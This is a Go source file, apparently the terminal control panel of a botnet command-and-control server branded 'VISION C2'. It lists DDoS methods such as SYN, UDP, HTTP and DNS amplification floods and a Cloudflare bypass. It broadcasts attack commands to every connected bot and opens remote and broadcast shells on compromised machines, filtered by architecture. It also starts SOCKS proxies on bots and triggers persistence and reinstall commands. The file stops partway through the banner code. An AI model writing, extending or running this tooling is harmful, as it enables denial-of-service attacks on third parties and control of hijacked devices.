package main

import (
	"fmt"
	"strconv"
	"strings"
	"time"

	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
)

// ============================================================================
// ANSI COLOR CONSTANTS
// 256-color ANSI escape codes for terminal styling
// ============================================================================

const (
	// Neon colors
	ColorCyan      = "\033[38;5;51m"
	ColorCyanLight = "\033[38;5;87m"
	ColorCyanMid   = "\033[38;5;123m"
	ColorCyanPale  = "\033[38;5;159m"
	ColorCyanWhite = "\033[38;5;195m"
	ColorWhite     = "\033[38;5;231m"
	ColorMagenta   = "\033[38;5;201m"
	ColorRed       = "\033[38;5;196m"
	ColorGreen     = "\033[38;5;46m"
	ColorOrange    = "\033[38;5;214m"
	ColorGray      = "\033[38;5;245m"
	ColorDarkGray  = "\033[38;5;240m"
	ColorBlack     = "\033[38;5;0m"
	ColorBgBlack   = "\033[48;5;0m"

	// Purple gradient for eye banner
	ColorPurple1 = "\033[38;5;93m"
	ColorPurple2 = "\033[38;5;99m"
	ColorPurple3 = "\033[38;5;105m"
	ColorPurple4 = "\033[38;5;111m"
	ColorPurple5 = "\033[38;5;117m"
	ColorPurple6 = "\033[38;5;123m"
	ColorPurple7 = "\033[38;5;159m"
	ColorPurple8 = "\033[38;5;195m"

	// Reset
	ColorReset = "\033[0m"

	// Screen control
	ClearScreen = "\033[2J\033[H"
)

// ============================================================================
// LIPGLOSS STYLES (for Bubble Tea TUI)
// ============================================================================

var (
	// Base styles
	titleStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("51")).
			Bold(true).
			Padding(0, 1)

	subtitleStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("245")).
			Italic(true)

	boxStyle = lipgloss.NewStyle().
			Border(lipgloss.RoundedBorder()).
			BorderForeground(lipgloss.Color("201")).
			Padding(1, 2)

	activeBoxStyle = lipgloss.NewStyle().
			Border(lipgloss.DoubleBorder()).
			BorderForeground(lipgloss.Color("51")).
			Padding(1, 2)

	statusOnlineStyle = lipgloss.NewStyle().
				Foreground(lipgloss.Color("46")).
				Bold(true)

	statusOfflineStyle = lipgloss.NewStyle().
				Foreground(lipgloss.Color("196")).
				Bold(true)

	menuItemStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("252")).
			Padding(0, 2).
			MarginBottom(1)

	menuSelectedStyle = lipgloss.NewStyle().
				Foreground(lipgloss.Color("51")).
				Background(lipgloss.Color("236")).
				Bold(true).
				Padding(0, 3).
				MarginBottom(1)

	errorStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("196")).
			Bold(true)

	successStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("46")).
			Bold(true)

	headerStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("201")).
			Bold(true).
			BorderStyle(lipgloss.NormalBorder()).
			BorderBottom(true).
			BorderForeground(lipgloss.Color("240"))

	// Bot list styles
	botItemStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("231"))

	botSelectedStyle = lipgloss.NewStyle().
				Foreground(lipgloss.Color("51")).
				Background(lipgloss.Color("236")).
				Bold(true)
)

// ============================================================================
// BUBBLE TEA TUI MODEL
// ============================================================================

// ViewState represents the current screen/view
type ViewState int

const (
	ViewDashboard ViewState = iota
	ViewBotList
	ViewAttack
	ViewMethodSelect
	ViewSocks
	ViewHelp
	ViewRemoteShell
	ViewBroadcastShell
)

// Attack methods available - synced with bot/main.go
var attackMethods = []struct {
	name string
	desc string
	cmd  string
}{
	{"UDP Flood", "Layer 4 UDP volume attack", "!udpflood"},
	{"TCP Flood", "Layer 4 TCP connection flood", "!tcpflood"},
	{"HTTP GET", "Layer 7 GET request flood", "!http"},
	{"HTTPS/TLS", "Layer 7 encrypted flood", "!https"},
	{"CF Bypass", "Cloudflare UAM bypass", "!cfbypass"},
	{"SYN Flood", "Raw SYN packet flood", "!syn"},
	{"ACK Flood", "ACK packet flood", "!ack"},
	{"GRE Flood", "GRE tunnel flood", "!gre"},
	{"DNS Amp", "DNS amplification attack", "!dns"},
}

// isL7Method checks if the attack method supports proxies
func isL7Method(cmd string) bool {
	return cmd == "!http" || cmd == "!https" || cmd == "!tls" || cmd == "!cfbypass"
}

// TUIAttack tracks attacks launched from TUI mode
type TUIAttack struct {
	ID       int
	Method   string
	Target   string
	Port     string
	Duration time.Duration
	Start    time.Time
}

// Global TUI attack tracker
var (
	tuiAttacks     = []TUIAttack{}
	tuiAttackIDSeq = 0
)

// TUIModel is the main Bubble Tea model for the CNC interface
type TUIModel struct {
	// View state
	currentView ViewState
	width       int
	height      int

	// Dashboard data
	botCount    int
	totalRAM    int64
	totalCPU    int
	status      string
	attackCount int

	// Menu
	menuItems  []string
	menuCursor int

	// Bot list
	bots      []BotInfo
	botCursor int

	// Attack form
	attackTarget      string
	attackPort        string
	attackDuration    string
	attackMethod      string
	attackCmd         string
	attackProxyURL    string // Proxy URL for L7 methods (optional)
	attackCursor      int
	methodCursor      int
	attackInputActive bool // true when typing in a field
	attackViewMode    int  // 0 = launch, 1 = ongoing

	// Messages
	statusMessage string
	errorMessage  string

	// Toast notification (temporary, auto-expires)
	toastMessage string
	toastExpiry  time.Time

	// Launch animation
	launchAnimating  bool      // true during launch animation
	launchAnimStage  int       // current animation stage (0-4)
	launchAnimStart  time.Time // when animation started
	launchAnimMethod string    // attack method being launched
	launchAnimTarget string    // target IP
	launchAnimPort   string    // port
	launchAnimDur    string    // duration

	// Remote shell
	selectedBot     string // Bot ID for remote shell
	selectedBotArch string
	shellInput      string
	shellOutput     []string // Output lines
	shellHistory    []string // Command history
	historyCursor   int

	// Broadcast targeting
	broadcastArch    string // Filter by architecture (empty = all)
	broadcastMinRAM  int64  // Minimum RAM in MB (0 = no filter)
	broadcastMaxBots int    // Max bots to target (0 = all)

	// Confirmation prompts
	confirmKill      bool // Waiting for kill confirmation
	confirmPersist   bool // Waiting for persist confirmation (broadcast)
	confirmReinstall bool // Waiting for reinstall confirmation (broadcast)

	// Help section navigation
	helpSection int // Current help section (0-4)

	// Socks manager
	socksList      []SocksInfo
	socksCursor    int
	socksViewMode  int    // 0 = all, 1 = active, 2 = stopped
	socksInputMode bool   // true when setting port for a bot
	socksNewPort   string // Port to start socks on

	// Quit flag
	quitting bool
}

// BotInfo holds display information about a bot
type BotInfo struct {
	ID       string
	Arch     string
	IP       string
	RAM      int64
	Uptime   time.Duration
	Selected bool
}

// SocksInfo holds display information about a socks proxy on a bot
type SocksInfo struct {
	BotID     string    // Bot running the socks
	BotIP     string    // Bot's IP address (for connecting)
	Port      string    // Port socks is running on
	Status    string    // "active", "stopped"
	StartedAt time.Time // When socks was started
}

// TickMsg for periodic updates
type TickMsg time.Time

// ConnLogMsg for connection events
type ConnLogMsg struct {
	Arch      string
	Connected bool
}

// AttackLogMsg for attack events
type AttackLogMsg struct {
	Method   string
	Target   string
	Port     string
	Duration string
	Started  bool // true = attack started, false = attack ended
}

// ShellOutputMsg for receiving shell command output
type ShellOutputMsg struct {
	BotID  string
	Output string
}

// launchAnimTickMsg for the attack launch animation
type launchAnimTickMsg struct{}

// Init initializes the Bubble Tea model
func (m TUIModel) Init() tea.Cmd {
	return tea.Batch(
		tickCmd(),
	)
}

func tickCmd() tea.Cmd {
	return tea.Tick(time.Second*2, func(t time.Time) tea.Msg {
		return TickMsg(t)
	})
}

// Update handles messages and updates the model
func (m TUIModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	switch msg := msg.(type) {
	case tea.KeyMsg:
		return m.handleKeyPress(msg)

	case tea.WindowSizeMsg:
		m.width = msg.Width
		m.height = msg.Height
		return m, nil

	case TickMsg:
		// Refresh bot count and stats
		m.botCount = getBotCount()
		m.totalRAM = getTotalRAM()
		m.totalCPU = getTotalCPU()
		return m, tickCmd()

	case ConnLogMsg:
		// Toast notification for connection events
		var entry string
		if msg.Connected {
			entry = lipgloss.NewStyle().Foreground(lipgloss.Color("46")).Render("▲") + " " +
				lipgloss.NewStyle().Foreground(lipgloss.Color("51")).Render(msg.Arch) + " " +
				lipgloss.NewStyle().Foreground(lipgloss.Color("46")).Render("connected")
		} else {
			entry = lipgloss.NewStyle().Foreground(lipgloss.Color("196")).Render("▼") + " " +
				lipgloss.NewStyle().Foreground(lipgloss.Color("51")).Render(msg.Arch) + " " +
				lipgloss.NewStyle().Foreground(lipgloss.Color("196")).Render("disconnected")
		}
		m.toastMessage = entry
		m.toastExpiry = time.Now().Add(3 * time.Second)
		return m, nil

	case AttackLogMsg:
		// Toast notification for attack events
		var entry string
		neonPink := lipgloss.NewStyle().Foreground(lipgloss.Color("201"))
		neonCyan := lipgloss.NewStyle().Foreground(lipgloss.Color("51"))
		neonGreen := lipgloss.NewStyle().Foreground(lipgloss.Color("46"))
		neonRed := lipgloss.NewStyle().Foreground(lipgloss.Color("196"))
		neonYellow := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))

		if msg.Started {
			entry = neonPink.Render("⚡") + " " +
				neonCyan.Render(msg.Method) + " " +
				neonYellow.Render(msg.Target+":"+msg.Port) + " " +
				neonGreen.Render("["+msg.Duration+"s]")
		} else {
			entry = neonRed.Render("■") + " " +
				neonCyan.Render(msg.Method) + " " +
				lipgloss.NewStyle().Foreground(lipgloss.Color("240")).Render("complete")
		}
		m.toastMessage = entry
		m.toastExpiry = time.Now().Add(4 * time.Second)
		return m, nil

	case ShellOutputMsg:
		// Add shell output to display
		if msg.Output != "" {
			lines := strings.Split(strings.TrimRight(msg.Output, "\n"), "\n")
			for _, line := range lines {
				m.shellOutput = append(m.shellOutput, line)
			}
			// Keep only last 50 lines
			if len(m.shellOutput) > 50 {
				m.shellOutput = m.shellOutput[len(m.shellOutput)-50:]
			}
		}
		return m, nil

	case launchAnimTickMsg:
		// Progress the launch animation
		if m.launchAnimating {
			m.launchAnimStage++
			if m.launchAnimStage >= 8 {
				// Animation complete
				m.launchAnimating = false
				m.launchAnimStage = 0
				return m, nil
			}
			// Slower ticks, extra pause on final stage
			delay := 250 * time.Millisecond
			if m.launchAnimStage >= 5 {
				delay = 400 * time.Millisecond // Pause on "ATTACK LAUNCHED"
			}
			return m, tea.Tick(delay, func(t time.Time) tea.Msg {
				return launchAnimTickMsg{}
			})
		}
		return m, nil
	}

	return m, nil
}

func (m TUIModel) handleKeyPress(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
	key := msg.String()

	// Handle shell input mode
	if m.currentView == ViewRemoteShell || m.currentView == ViewBroadcastShell {
		switch key {
		case "esc":
			m.currentView = ViewDashboard
			m.shellInput = ""
			return m, nil
		case "enter":
			if m.shellInput != "" {
				return m.executeShellCommand()
			}
			return m, nil
		case "backspace":
			if len(m.shellInput) > 0 {
				m.shellInput = m.shellInput[:len(m.shellInput)-1]
			}
			return m, nil
		case "up":
			// History navigation
			if len(m.shellHistory) > 0 && m.historyCursor > 0 {
				m.historyCursor--
				m.shellInput = m.shellHistory[m.historyCursor]
			}
			return m, nil
		case "down":
			if m.historyCursor < len(m.shellHistory)-1 {
				m.historyCursor++
				m.shellInput = m.shellHistory[m.historyCursor]
			} else {
				m.historyCursor = len(m.shellHistory)
				m.shellInput = ""
			}
			return m, nil
		case "ctrl+f":
			// Clear output
			m.shellOutput = []string{}
			return m, nil
		case "ctrl+p":
			// Send !persist - with confirmation for broadcast
			if m.currentView == ViewBroadcastShell {
				m.confirmPersist = true
				return m, nil
			}
			m.shellInput = "!persist"
			return m.executeShellCommand()
		case "ctrl+r":
			// Send !reinstall - with confirmation for broadcast
			if m.currentView == ViewBroadcastShell {
				m.confirmReinstall = true
				return m, nil
			}
			m.shellInput = "!reinstall"
			return m.executeShellCommand()
		case "ctrl+x":
			// Trigger kill confirmation - only for single bot
			if m.currentView == ViewRemoteShell {
				m.confirmKill = true
			}
			return m, nil
		case "y", "Y":
			// Confirm kill
			if m.confirmKill && m.currentView == ViewRemoteShell {
				m.confirmKill = false
				m.shellInput = "!lolnogtfo"
				return m.executeShellCommand()
			}
			// Confirm persist broadcast
			if m.confirmPersist && m.currentView == ViewBroadcastShell {
				m.confirmPersist = false
				m.shellInput = "!persist"
				return m.executeShellCommand()
			}
			// Confirm reinstall broadcast
			if m.confirmReinstall && m.currentView == ViewBroadcastShell {
				m.confirmReinstall = false
				m.shellInput = "!reinstall"
				return m.executeShellCommand()
			}
			// Otherwise treat as normal input
			m.shellInput += key
			return m, nil
		case "n", "N":
			// Cancel kill confirmation
			if m.confirmKill {
				m.confirmKill = false
				m.shellOutput = append(m.shellOutput, lipgloss.NewStyle().Foreground(lipgloss.Color("240")).Render("  [kill cancelled]"))
				return m, nil
			}
			// Cancel persist confirmation
			if m.confirmPersist {
				m.confirmPersist = false
				m.shellOutput = append(m.shellOutput, lipgloss.NewStyle().Foreground(lipgloss.Color("240")).Render("  [persist cancelled]"))
				return m, nil
			}
			// Cancel reinstall confirmation
			if m.confirmReinstall {
				m.confirmReinstall = false
				m.shellOutput = append(m.shellOutput, lipgloss.NewStyle().Foreground(lipgloss.Color("240")).Render("  [reinstall cancelled]"))
				return m, nil
			}
			// Otherwise treat as normal input
			m.shellInput += key
			return m, nil
		case "ctrl+a":
			// Toggle arch filter (broadcast only)
			if m.currentView == ViewBroadcastShell {
				archs := []string{"", "x86_64", "aarch64", "arm", "mips", "mipsel"}
				currentIdx := 0
				for i, a := range archs {
					if a == m.broadcastArch {
						currentIdx = i
						break
					}
				}
				m.broadcastArch = archs[(currentIdx+1)%len(archs)]
			}
			return m, nil
		case "ctrl+g":
			// Cycle min RAM filter (broadcast only) - using ctrl+g since ctrl+m = enter
			if m.currentView == ViewBroadcastShell {
				ramLevels := []int64{0, 512, 1024, 2048, 4096}
				currentIdx := 0
				for i, r := range ramLevels {
					if r == m.broadcastMinRAM {
						currentIdx = i
						break
					}
				}
				m.broadcastMinRAM = ramLevels[(currentIdx+1)%len(ramLevels)]
			}
			return m, nil
		case "ctrl+n":
			// Cycle max bots filter (broadcast only)
			if m.currentView == ViewBroadcastShell {
				maxLevels := []int{0, 10, 50, 100, 500}
				currentIdx := 0
				for i, n := range maxLevels {
					if n == m.broadcastMaxBots {
						currentIdx = i
						break
					}
				}
				m.broadcastMaxBots = maxLevels[(currentIdx+1)%len(maxLevels)]
			}
			return m, nil
		default:
			// Add character to shell input
			if len(key) == 1 || key == "space" {
				if key == "space" {
					key = " "
				}
				m.shellInput += key
			}
			return m, nil
		}
	}

	// Handle text input mode for attack form
	if m.currentView == ViewAttack && m.attackInputActive {
		// Determine max field index (4 if L7 method selected, otherwise 3)
		maxField := 3
		if isL7Method(m.attackCmd) {
			maxField = 4 // Include proxy URL field
		}
		switch key {
		case "enter":
			m.attackInputActive = false
			// Auto-advance to next field
			if m.attackCursor < maxField {
				m.attackCursor++
				// Skip to proxy field (4) if it's L7 and we're past method (3)
				if m.attackCursor == 3 {
					// Method field - don't auto-activate input
				} else if m.attackCursor < maxField {
					m.attackInputActive = true // Keep editing next field
				} else if m.attackCursor == 4 && isL7Method(m.attackCmd) {
					m.attackInputActive = true // Proxy URL field
				}
			}
			return m, nil
		case "esc":
			m.attackInputActive = false
			return m, nil
		case "backspace":
			switch m.attackCursor {
			case 0:
				if len(m.attackTarget) > 0 {
					m.attackTarget = m.attackTarget[:len(m.attackTarget)-1]
				}
			case 1:
				if len(m.attackPort) > 0 {
					m.attackPort = m.attackPort[:len(m.attackPort)-1]
				}
			case 2:
				if len(m.attackDuration) > 0 {
					m.attackDuration = m.attackDuration[:len(m.attackDuration)-1]
				}
			case 4:
				if len(m.attackProxyURL) > 0 {
					m.attackProxyURL = m.attackProxyURL[:len(m.attackProxyURL)-1]
				}
			}
			return m, nil
		default:
			// Add character to current field
			if len(key) == 1 {
				switch m.attackCursor {
				case 0:
					m.attackTarget += key
				case 1:
					if key >= "0" && key <= "9" {
						m.attackPort += key
					}
				case 2:
					if key >= "0" && key <= "9" {
						m.attackDuration += key
					}
				case 4:
					m.attackProxyURL += key
				}
			}
			return m, nil
		}
	}

	// Handle socks input mode (just port input)
	if m.currentView == ViewSocks && m.socksInputMode {
		switch key {
		case "esc":
			m.socksInputMode = false
			m.socksNewPort = ""
			return m, nil
		case "enter":
			if m.socksNewPort != "" && m.socksCursor < len(m.bots) {
				// Send !socks command to the selected bot
				bot := m.bots[m.socksCursor]
				cmd := fmt.Sprintf("!socks %s", m.socksNewPort)
				sendToSingleBot(bot.ID, cmd)

				// Track it in socksList
				newSocks := SocksInfo{
					BotID:     bot.ID,
					BotIP:     bot.IP,
					Port:      m.socksNewPort,
					Status:    "active",
					StartedAt: time.Now(),
				}
				// Remove any existing entry for this bot
				for i, s := range m.socksList {
					if s.BotID == bot.ID {
						m.socksList = append(m.socksList[:i], m.socksList[i+1:]...)
						break
					}
				}
				m.socksList = append(m.socksList, newSocks)
				m.socksInputMode = false
				m.socksNewPort = ""
			}
			return m, nil
		case "backspace":
			if len(m.socksNewPort) > 0 {
				m.socksNewPort = m.socksNewPort[:len(m.socksNewPort)-1]
			}
			return m, nil
		default:
			if len(key) == 1 && key >= "0" && key <= "9" {
				m.socksNewPort += key
			}
			return m, nil
		}
	}

	switch key {
	case "ctrl+c":
		m.quitting = true
		return m, tea.Quit

	case "esc":
		// Always go back to main menu
		m.currentView = ViewDashboard
		return m, nil

	case "q":
		if m.currentView == ViewDashboard {
			m.quitting = true
			return m, tea.Quit
		}
		m.currentView = ViewDashboard
		return m, nil

	case "up", "k":
		switch m.currentView {
		case ViewDashboard:
			if m.menuCursor > 0 {
				m.menuCursor--
			}
		case ViewBotList:
			if m.botCursor > 0 {
				m.botCursor--
			}
		case ViewAttack:
			if m.attackCursor > 0 {
				m.attackCursor--
			}
		case ViewMethodSelect:
			if m.methodCursor > 0 {
				m.methodCursor--
			}
		case ViewSocks:
			if !m.socksInputMode && m.socksCursor > 0 {
				m.socksCursor--
			}
		}

	case "down", "j":
		switch m.currentView {
		case ViewDashboard:
			if m.menuCursor < len(m.menuItems)-1 {
				m.menuCursor++
			}
		case ViewBotList:
			if m.botCursor < len(m.bots)-1 {
				m.botCursor++
			}
		case ViewAttack:
			// Max field is 4 (proxy URL) if L7 method, otherwise 3 (method)
			maxField := 3
			if isL7Method(m.attackCmd) {
				maxField = 4
			}
			if m.attackCursor < maxField {
				m.attackCursor++
			}
		case ViewMethodSelect:
			if m.methodCursor < len(attackMethods)-1 {
				m.methodCursor++
			}
		case ViewSocks:
			if !m.socksInputMode {
				// Determine max cursor based on view mode
				var maxLen int
				switch m.socksViewMode {
				case 0: // All Bots
					maxLen = len(m.bots)
				case 1: // Active Socks
					for _, sock := range m.socksList {
						if sock.Status == "active" {
							maxLen++
						}
					}
				case 2: // Stopped
					for _, sock := range m.socksList {
						if sock.Status == "stopped" {
							maxLen++
						}
					}
				}
				if m.socksCursor < maxLen-1 {
					m.socksCursor++
				}
			}
		}

	case "left":
		if m.currentView == ViewHelp {
			if m.helpSection > 0 {
				m.helpSection--
			}
		} else if m.currentView == ViewAttack && !m.attackInputActive {
			if m.attackViewMode > 0 {
				m.attackViewMode--
			}
		} else if m.currentView == ViewSocks {
			if m.socksViewMode > 0 {
				m.socksViewMode--
				m.socksCursor = 0
			}
		}

	case "right":
		if m.currentView == ViewHelp {
			if m.helpSection < 4 { // 5 sections: 0-4
				m.helpSection++
			}
		} else if m.currentView == ViewAttack && !m.attackInputActive {
			if m.attackViewMode < 1 {
				m.attackViewMode++
			}
		} else if m.currentView == ViewSocks {
			if m.socksViewMode < 2 {
				m.socksViewMode++
				m.socksCursor = 0
			}
		}

	case "enter":
		return m.handleEnter()

	case "s", "S":
		// Stop all attacks (in attack view, ongoing tab)
		if m.currentView == ViewAttack && m.attackViewMode == 1 {
			// Count and clear telnet attacks
			count := len(ongoingAttacks)
			for k := range ongoingAttacks {
				delete(ongoingAttacks, k)
			}
			// Count and clear TUI attacks
			count += len(tuiAttacks)
			tuiAttacks = []TUIAttack{}

			sendToBots("!stop")
			neonGreen := lipgloss.NewStyle().Foreground(lipgloss.Color("46"))
			neonRed := lipgloss.NewStyle().Foreground(lipgloss.Color("196"))
			m.toastMessage = neonRed.Render("🛑") + " " + neonGreen.Render(fmt.Sprintf("Stopped %d attack(s)", count))
			m.toastExpiry = time.Now().Add(3 * time.Second)
			return m, nil
		}
		// Start socks on selected bot (in socks view)
		if m.currentView == ViewSocks && !m.socksInputMode && len(m.bots) > 0 {
			m.socksInputMode = true
			m.socksNewPort = "1080"
			return m, nil
		}

	case "x", "X":
		// Stop socks on selected bot (in socks view)
		if m.currentView == ViewSocks && !m.socksInputMode && m.socksCursor < len(m.bots) {
			bot := m.bots[m.socksCursor]
			// Send !stopsocks command
			sendToSingleBot(bot.ID, "!stopsocks")
			// Update status in socksList
			for i, sock := range m.socksList {
				if sock.BotID == bot.ID {
					m.socksList[i].Status = "stopped"
					break
				}
			}
			return m, nil
		}

	case "l", "L":
		// In help view, navigate sections
		if m.currentView == ViewHelp {
			if m.helpSection < 4 {
				m.helpSection++
			}
			return m, nil
		}
		// Launch attack
		if m.currentView == ViewAttack {
			return m.launchAttack()
		}

	case "h", "H":
		// In help view, navigate sections
		if m.currentView == ViewHelp {
			if m.helpSection > 0 {
				m.helpSection--
			}
		}

	case "tab":
		// In attack view, tab cycles through fields
		if m.currentView == ViewAttack {
			m.attackCursor = (m.attackCursor + 1) % 4
			return m, nil
		}
		// Otherwise cycle through views
		m.currentView = (m.currentView + 1) % 4
		return m, nil

	case "1":
		m.currentView = ViewDashboard
	case "2":
		m.currentView = ViewBotList
		m.refreshBotList()
	case "3":
		m.currentView = ViewAttack
	case "4":
		m.currentView = ViewHelp

	case "r":
		// Refresh
		m.botCount = getBotCount()
		m.totalRAM = getTotalRAM()
		m.totalCPU = getTotalCPU()
		if m.currentView == ViewBotList {
			m.refreshBotList()
		}
		m.statusMessage = "Refreshed"
	}

	return m, nil
}

func (m TUIModel) handleEnter() (tea.Model, tea.Cmd) {
	switch m.currentView {
	case ViewDashboard:
		switch m.menuCursor {
		case 0: // Bots
			m.currentView = ViewBotList
			m.refreshBotList()
		case 1: // Attack Center
			m.currentView = ViewAttack
			m.attackViewMode = 0 // Start on launch tab
		case 2: // Broadcast Shell
			m.currentView = ViewBroadcastShell
			m.shellOutput = []string{}
			m.shellInput = ""
			m.selectedBot = ""
		case 3: // Socks Manager
			m.currentView = ViewSocks
			m.socksInputMode = false
			m.refreshBotList() // Refresh bot list for socks view
		case 4: // Help
			m.currentView = ViewHelp
		case 5: // Exit
			m.quitting = true
			return m, tea.Quit
		}
	case ViewAttack:
		if m.attackCursor == 3 { // Method field selected
			m.currentView = ViewMethodSelect
		} else if m.attackCursor == 4 && isL7Method(m.attackCmd) {
			// Proxy URL field - start text input
			m.attackInputActive = true
		} else if m.attackCursor < 3 {
			// Start text input for target/port/duration
			m.attackInputActive = true
		}
	case ViewMethodSelect:
		// Select the method and go back to attack form
		m.attackMethod = attackMethods[m.methodCursor].name
		m.attackCmd = attackMethods[m.methodCursor].cmd
		m.currentView = ViewAttack
	case ViewBotList:
		// Open remote shell for selected bot
		if len(m.bots) > 0 && m.botCursor < len(m.bots) {
			m.selectedBot = m.bots[m.botCursor].ID
			m.selectedBotArch = m.bots[m.botCursor].Arch
			m.shellOutput = []string{}
			m.shellInput = ""
			m.shellHistory = []string{}
			m.historyCursor = 0
			m.currentView = ViewRemoteShell
		}
	}
	return m, nil
}

func (m *TUIModel) refreshBotList() {
	m.bots = []BotInfo{}
	botConnsLock.RLock()
	defer botConnsLock.RUnlock()
	for id, bot := range botConnections {
		if bot.authenticated {
			m.bots = append(m.bots, BotInfo{
				ID:     id,
				Arch:   bot.arch,
				IP:     bot.ip,
				RAM:    bot.ram,
				Uptime: time.Since(bot.connectedAt),
			})
		}
	}
}

// launchAttack sends the attack command to all bots
func (m TUIModel) launchAttack() (tea.Model, tea.Cmd) {
	// Validate fields
	if m.attackTarget == "" {
		m.errorMessage = "Target required"
		return m, nil
	}
	if m.attackPort == "" {
		m.attackPort = "80"
	}
	if m.attackDuration == "" {
		m.attackDuration = "30"
	}
	if m.attackCmd == "" {
		m.errorMessage = "Select attack method"
		return m, nil
	}

	// Parse duration
	durSec, err := strconv.Atoi(m.attackDuration)
	if err != nil {
		durSec = 30
	}
	dur := time.Duration(durSec) * time.Second

	// Build command - include proxy URL if L7 method and URL provided
	var cmd string
	if isL7Method(m.attackCmd) && m.attackProxyURL != "" {
		cmd = fmt.Sprintf("%s %s %s %s -pu %s", m.attackCmd, m.attackTarget, m.attackPort, m.attackDuration, m.attackProxyURL)
	} else {
		cmd = fmt.Sprintf("%s %s %s %s", m.attackCmd, m.attackTarget, m.attackPort, m.attackDuration)
	}

	// Send to all bots
	sendToBots(cmd)

	// Track the attack in TUI attacks list
	tuiAttackIDSeq++
	newAttack := TUIAttack{
		ID:       tuiAttackIDSeq,
		Method:   m.attackMethod,
		Target:   m.attackTarget,
		Port:     m.attackPort,
		Duration: dur,
		Start:    time.Now(),
	}
	tuiAttacks = append(tuiAttacks, newAttack)

	// Start cleanup goroutine for this attack
	go func(attackID int, duration time.Duration) {
		time.Sleep(duration)
		// Remove attack from list
		for i, a := range tuiAttacks {
			if a.ID == attackID {
				tuiAttacks = append(tuiAttacks[:i], tuiAttacks[i+1:]...)
				break
			}
		}
	}(newAttack.ID, dur)

	// Start launch animation instead of just showing toast
	m.launchAnimating = true
	m.launchAnimStage = 0
	m.launchAnimStart = time.Now()
	m.launchAnimMethod = m.attackMethod
	m.launchAnimTarget = m.attackTarget
	m.launchAnimPort = m.attackPort
	m.launchAnimDur = m.attackDuration

	m.statusMessage = ""
	m.errorMessage = ""
	m.attackCount++

	// Reset attack fields to defaults
	m.attackTarget = ""
	m.attackPort = "80"
	m.attackDuration = "60"
	m.attackMethod = ""
	m.attackCmd = ""
	m.attackProxyURL = ""
	m.attackCursor = 0

	// Return with a tick command to animate
	return m, tea.Tick(200*time.Millisecond, func(t time.Time) tea.Msg {
		return launchAnimTickMsg{}
	})
}

// executeShellCommand sends a shell command to the selected bot or broadcasts
func (m TUIModel) executeShellCommand() (tea.Model, tea.Cmd) {
	if m.shellInput == "" {
		return m, nil
	}

	cmd := m.shellInput

	// Add to history
	m.shellHistory = append(m.shellHistory, cmd)
	m.historyCursor = len(m.shellHistory)

	// Show command in output
	prompt := lipgloss.NewStyle().Foreground(lipgloss.Color("46")).Render("$")
	m.shellOutput = append(m.shellOutput, prompt+" "+cmd)

	if m.currentView == ViewRemoteShell && m.selectedBot != "" {
		// Send to specific bot
		fullCmd := fmt.Sprintf("!shell %s", cmd)
		sendToSingleBot(m.selectedBot, fullCmd)
	} else if m.currentView == ViewBroadcastShell {
		// Broadcast with filters (detached)
		fullCmd := fmt.Sprintf("!exec %s", cmd)
		sentCount := sendToFilteredBots(fullCmd, m.broadcastArch, m.broadcastMinRAM, m.broadcastMaxBots)

		// Build filter description
		filterInfo := ""
		if m.broadcastArch != "" || m.broadcastMinRAM > 0 || m.broadcastMaxBots > 0 {
			filters := []string{}
			if m.broadcastArch != "" {
				filters = append(filters, fmt.Sprintf("arch=%s", m.broadcastArch))
			}
			if m.broadcastMinRAM > 0 {
				filters = append(filters, fmt.Sprintf("≥%dMB", m.broadcastMinRAM))
			}
			if m.broadcastMaxBots > 0 {
				filters = append(filters, fmt.Sprintf("≤%d", m.broadcastMaxBots))
			}
			filterInfo = fmt.Sprintf(" (%s)", strings.Join(filters, ", "))
		}

		m.shellOutput = append(m.shellOutput, lipgloss.NewStyle().Foreground(lipgloss.Color("240")).Render(
			fmt.Sprintf("  [broadcast sent to %d bots%s]", sentCount, filterInfo)))
	}

	m.shellInput = ""
	return m, nil
}

// View renders the current view
func (m TUIModel) View() string {
	if m.quitting {
		return "\n  " + subtitleStyle.Render("Goodbye from VISION C2") + "\n\n"
	}

	var content string
	switch m.currentView {
	case ViewDashboard:
		content = m.viewDashboard()
	case ViewBotList:
		content = m.viewBotList()
	case ViewAttack:
		content = m.viewAttack()
	case ViewMethodSelect:
		content = m.viewMethodSelect()
	case ViewSocks:
		content = m.viewSocks()
	case ViewHelp:
		content = m.viewHelp()
	case ViewRemoteShell:
		content = m.viewRemoteShell()
	case ViewBroadcastShell:
		content = m.viewBroadcastShell()
	default:
		content = m.viewDashboard()
	}

	// Get terminal dimensions
	width := m.width
	height := m.height
	if width == 0 {
		width = 120
	}
	if height == 0 {
		height = 40
	}

	// Render status bar
	statusBar := m.renderStatusBar()

	// Calculate status bar height (1 line base + 1 if toast active)
	statusBarHeight := 1
	if m.toastMessage != "" && time.Now().Before(m.toastExpiry) {
		statusBarHeight = 2
	}

	// Count content lines
	contentLines := strings.Count(content, "\n") + 1

	// Calculate padding needed to push status bar to bottom
	availableHeight := height - statusBarHeight
	paddingLines := availableHeight - contentLines
	if paddingLines < 0 {
		paddingLines = 0
	}

	// Build final output with content, padding, and footer locked to bottom
	padding := strings.Repeat("\n", paddingLines)

	return content + padding + statusBar
}

func (m TUIModel) viewDashboard() string {
	var b strings.Builder

	// ASCII Banner with gradient effect
	bannerLines := []string{
		"",
		"",

		" ____   ____.__       .__                ________  ________  ",
		" \\   \\ /   /|__| _____|__| ____   ____   \\_   ___ \\ \\_____  \\ ",
		"  \\   Y   / |  |/  ___/  |/  _ \\ /    \\  /    \\  \\/  /  ____/ ",
		"   \\     /  |  |\\___ \\|  (  <_> )   |  \\ \\     \\____/       \\ ",
		"    \\___/   |__/____  >__|\\____/|___|  /  \\______  /\\_______ \\",
		"                    \\/               \\/          \\/         \\/",
		" ═══════════════════════════════════════════════════════════════",
		"     ☾℣☽  B O T N E T   C O M M A N D   &   C O N T R O L  ☾℣☽   ",
		" ═══════════════════════════════════════════════════════════════",
		"",
	}
	// Gradient colors from purple to cyan
	gradientColors := []string{
		"93",  // Purple
